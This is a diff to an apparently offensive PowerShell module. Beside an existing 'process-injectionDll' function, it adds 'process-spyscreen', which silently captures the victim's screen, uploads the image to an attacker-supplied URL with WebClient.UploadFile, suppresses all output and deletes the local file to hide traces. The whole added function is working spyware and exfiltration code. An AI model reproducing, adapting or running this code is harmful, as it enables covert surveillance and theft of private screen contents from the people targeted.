@@ -343,7 +343,29 @@ function process-injectionDll {
 Export-ModuleMember -Function process-injectionDll 
 Set-Alias -Name process-injectionDll -Value process-injectionDll
 
-
+function process-spyscreen {
+param (
+    [string]$atk
+)
+[Reflection.Assembly]::LoadWithPartialName("System.Drawing")
+function screenshot([Drawing.Rectangle]$bounds, $path) {
+   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
+   $graphics = [Drawing.Graphics]::FromImage($bmp)
+   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
+   $bmp.Save($path)
+   $graphics.Dispose()
+   $bmp.Dispose()
+}
+$bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1920, 1024)
+$screenshotPath = "C:\Users\Public\screenshot.png"
+screenshot $bounds $screenshotPath
+$webClient = New-Object System.Net.WebClient
+$webClient.UploadFile($atk, $screenshotPath) > $null 2>&1
+sleep(0.3)
+Remove-Item -Path $screenshotPath -Force -ErrorAction SilentlyContinue
+}
+Export-ModuleMember -Function process-spyscreen 
+Set-Alias -Name process-spyscreen -Value process-spyscreen
 
 
 
